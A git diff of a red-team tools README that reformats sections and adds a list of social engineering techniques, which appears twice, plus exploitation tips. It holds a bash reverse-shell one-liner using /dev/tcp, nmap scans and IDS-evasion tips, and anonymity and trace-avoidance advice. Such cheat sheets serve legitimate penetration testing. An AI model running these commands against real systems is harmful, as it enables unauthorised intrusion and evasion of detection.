@@ -1,16 +1,8 @@
-# 🛠️ Red team tools, tips & tricks
+# Red team tools, tips & tricks
 
 A collection of random custom scripts for penetration testing and red team tasks.
 
-## 📌 Includes
-
-* 🔁 Automation scripts
-* 🔍 Reconnaissance tools
-* 📡 Scanning utilities
-* 💥 Exploitation scripts
-* 🩻 Post-exploitation helpers
-* 📄 Report generation tools
-* 🗒️ Notes & cheat sheets
+📌 Includes: Automation scripts, Reconnaissance tools, Scanning utilities, Exploitation scripts, Post-exploitation helpers, Report generation tools, Notes & cheat sheets etc.
 
 
 
@@ -27,9 +19,26 @@ A collection of random custom scripts for penetration testing and red team tasks
 * [General Notes](#-general-notes)
 
 -----
+\- Impersonation /identity theft - the attacker creates a fake online profile to impersonate an employee and trick colleagues into disclosing confidential information.  
+\- Phishing - email, text  
+\- Pretexting -  fabricates a convincing and detailed scenario  
+\- Baiting  - lure using free gifts, software  
+\- Tailgating - follow authorized person
+\- Shoulder surf
+\- Quid pro quo - bribe  
+\- Honeypot - fake online persona  
+\- Dumpster diving - trash, trash-can   
+\- Evil twin i.e fake wi-fi Access point  
+\- Vishing (Voice phishing) - phone calls or voice messages to impersonate a legitimate entity and extract sensitive information.  
+\- Typosquatting/ URL hijacking - slight misspelling of a legitimate website.  
+
 
 📂 Repo-Structure
-```
+
+<details>
+<summary>📂 Click to expand</summary>
+   
+```ini
 red-team-tools/
 ├── automation/
 ├── recon/
@@ -42,22 +51,40 @@ red-team-tools/
 └── README.md/
 ```
 
+</details>
+
 ---
 
 ## 🌟 Tips & tricks
 
 
+✅ To exploit a software, you MUST have a background knowledge of defense mechanisms used by the software
+
+✅ Figure out how to trigger an undiscovered vulnerability yourself, boom, zero day
+
+✅ Every failed exploit has a stealthier alternative
+
+✅Prioritize attack vectors based on exploitability and impact.
+
+✅Avoid leaving traces by using proxies, VMs, or isolated environments.
+
+✅Document all actions without storing sensitive data insecurely.
+
+
 
 ***Find your public IP address right on the terminal***
-```
+
+```bash
 curl -s wtfismyip.com/json | jq
 curl ifconfig.me
 ```
 
 ### Stay anonymous
+
 \- ⚠️ Anonymity is not just the tool — it’s behavior. One slip (like logging into your mail or reusing usernames) can burn the whole setup.
 
 ***Multi-Layered Anonymization Solution(VPN + Tor + Sandboxing)***
+
 1. Operating systems
    
 \- Tails OS  
@@ -72,6 +99,7 @@ curl ifconfig.me
 
 
 2. Tor-Enabled Anonymization software
+
 \- ParrotOS anonsurf  
 
 \- [Auto_Tor_IP_changer by FDX100](https://github.com/FDX100/Auto_Tor_IP_changer )  
@@ -96,6 +124,7 @@ curl ifconfig.me
 
 
 ### Automation
+
 ***Automatically install essential hacking & dev tools on a fresh linux install***
 
 \- [Install tools script](https://github.com/80h3m14n/red-team-tools/blob/main/automation/install-tools.sh)
@@ -131,17 +160,12 @@ Value: $E[1;30;104m►$E[1;37;104m $P $E[1;94;40m►$E[0m
 ```
 
 
-✅ To exploit a software, you MUST have a background knowledge of defense mechanisms used by the software
-
-✅ Figure out how to trigger an undiscovered vulnerability yourself, boom, zero day
-
-✅ Every failed exploit has a stealthier alternative
-
-
 
 ---
 
 ## 🔍 Recon & Enumeration
+
+Reconnaissance (recon) in red teaming is the foundational phase where ethical hackers gather intelligence about a target organization to identify vulnerabilities and plan realistic attack simulations.
 
 ```bash
 # DNS Lookup
@@ -152,6 +176,31 @@ host domain.com
 ffuf -w subs.txt -u https://FUZZ.target.com
 ```
 
+**Social engineering tehniques**
+
+\- Impersonation /identity theft - the attacker creates a fake online profile to impersonate an employee and trick colleagues into disclosing confidential information.  
+
+\- Phishing - email, text  
+
+\- Pretexting -  fabricates a convincing and detailed scenario  
+
+\- Baiting  - lure using free gifts, software  
+
+\- Tailgating - follow authorized person
+
+\- Shoulder surf
+
+\- Quid pro quo - bribe  
+
+\- Honeypot - fake online persona  
+
+\- Dumpster diving - trash, trash-can   
+
+\- Evil twin i.e fake wi-fi Access point  
+
+\- Vishing (Voice phishing) - phone calls or voice messages to impersonate a legitimate entity and extract sensitive information.  
+
+\- Typosquatting/ URL hijacking - slight misspelling of a legitimate website. 
 
 
 ---
@@ -164,7 +213,7 @@ To bypass firewall blocks and avoid IDS/IPS detection:
 
 \- Slow Scans: Introduce delays between packets to evade rate-based detection.
 
-```
+```bash
 sudo nmap -sS -v -v -Pn 192.168.0.0/24
 ```
 
@@ -176,9 +225,10 @@ sudo nmap -sS -v -v -Pn 192.168.0.0/24
 
 \- Try alternative tools
 
-```
+```bash
 # Nmap full scan
 nmap -p- -T4 -A -v target.com
+
 sudo nmap 10.0.0.1/24 --open -oG scan-results; cat scan-results | grep "/open" | cut -d " " -f 2
 ```
 
@@ -187,9 +237,11 @@ sudo nmap 10.0.0.1/24 --open -oG scan-results; cat scan-results | grep "/open" |
 
 ## 💥 Exploitation
 
+The exploitation phase in red teaming involves leveraging identified vulnerabilities from the reconnaissance phase to gain unauthorized access to systems, networks, or data.
 
-**Bash**
-```bash Reverse Shell One-Liners
+**Bash reverse shell One-Liners**
+
+```bash 
 bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
 ```
 
@@ -309,6 +361,7 @@ nikto -h http://target.com
 
 
 ## 📝 General Notes
+
 Check for .bak, .old, .zip files on webservers
 
 Default creds go a long way
@@ -333,9 +386,11 @@ Always verify shell stability (TTY, backgrounding)
 
 \- [Zero-day](https://www.zero-day.cz/)
 
+\- [Red team tools by A-poc](https://github.com/A-poc/RedTeam-Tools)
 
 
 ---
+
 
 ## 🧾 License
 
